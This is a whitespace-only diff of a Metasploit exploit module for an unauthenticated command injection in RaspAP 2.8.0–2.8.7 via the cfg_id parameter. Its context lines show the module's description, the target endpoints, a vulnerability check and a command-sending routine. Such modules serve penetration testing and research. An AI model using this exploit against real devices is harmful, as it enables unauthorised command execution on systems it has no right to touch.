@@ -2,14 +2,14 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
- 
+
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
- 
+
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::CmdStager
   prepend Msf::Exploit::Remote::AutoCheck
- 
+
   def initialize(info = {})
     super(
       update_info(
@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Exploit::Remote
           A Command Injection vulnerability in RaspAP versions 2.8.0 thru 2.8.7 allows
           unauthenticated attackers to execute arbitrary commands in the context of the user running RaspAP via the cfg_id
           parameter in /ajax/openvpn/activate_ovpncfg.php and /ajax/openvpn/del_ovpncfg.php.
- 
+
           Successfully tested against RaspAP 2.8.0 and 2.8.7.
         },
         'License' => MSF_LICENSE,
@@ -78,21 +78,21 @@ class MetasploitModule < Msf::Exploit::Remote
       ]
     )
   end
- 
+
   def check
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'ajax', 'openvpn', 'del_ovpncfg.php'),
       'method' => 'POST'
     )
     return CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
- 
+
     if res.code == 200
       return CheckCode::Appears
     end
- 
+
     CheckCode::Safe
   end
- 
+
   def execute_command(cmd, _opts = {})
     send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'ajax', 'openvpn', 'del_ovpncfg.php'),
@@ -102,7 +102,7 @@ class MetasploitModule < Msf::Exploit::Remote
       }
     )
   end
- 
+
   def exploit
     case target['Type']
     when :unix_cmd
@@ -114,4 +114,3 @@ class MetasploitModule < Msf::Exploit::Remote
     end
   end
 end
- 
